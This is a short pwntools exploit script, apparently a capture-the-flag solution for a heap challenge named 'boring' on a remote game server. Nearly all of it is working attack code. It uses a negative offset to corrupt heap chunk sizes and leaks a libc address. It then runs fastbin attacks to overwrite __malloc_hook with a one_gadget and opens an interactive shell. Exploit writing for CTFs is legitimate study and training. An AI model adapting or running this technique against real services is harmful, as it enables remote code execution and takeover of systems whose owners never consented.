from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux','sp','-h','-l','120']

#p = process('./boring')
p = remote('8sdafgh.gamectf.com', 10001)


#gdb.attach(p,'c')
lib = ELF('libc.so')

def add(size, c):
    p.sendlineafter('5.Exit\n', '1')
    p.sendlineafter('3.Large\n', str(size))
    p.sendlineafter(':',c)

def update(idx, offset, c):
    p.sendlineafter('5.Exit\n', '2')
    p.sendlineafter('?', str(idx))
    p.sendlineafter('?', str(offset))
    p.sendlineafter(':', c)

def delete(idx):
    p.sendlineafter('5.Exit\n', '3')
    p.sendlineafter('?', str(idx))

def show(idx):
    p.sendlineafter('5.Exit\n', '4')
    p.sendlineafter('?', str(idx))

add(2, 'a')# 0
add(2, 'a')# 0x30 1
add(2, 'a')# 0x30 2
add(1, 'a')# 0x20 3
add(2, 'a')# 4
add(2, 'a')# 5
add(2, 'a')

update(1, -2147483648 , p64(0)*3 + p64(0xb1))
delete(1)
add(2, '')# 6
show(2)
p.recvuntil('\x78')
temp = u64('\x78'+p.recv(5)+'\x00\x00')
libc_base = temp - 0x68 - lib.sym['__malloc_hook']
print hex(libc_base)
one = libc_base + 0xf1147

update(2, -2147483648, p64(0)*3 + p64(0x51))
update(3, 0, p64(0x50)+p64(0x20))
delete(2)


add(2, p64(libc_base + lib.sym['__malloc_hook']+53)) #6


update(4, -2147483648, p64(0)*3+p64(0x61))
update(5, 0, p64(0)*2+p64(0x60)+p64(0x20))
delete(4)


add(3, '')
add(3, '\x00'*(0x23)+p64(libc_base+lib.sym['__malloc_hook']-0x23))
add(3, 'a'*0x13+p64(one))



p.interactive()
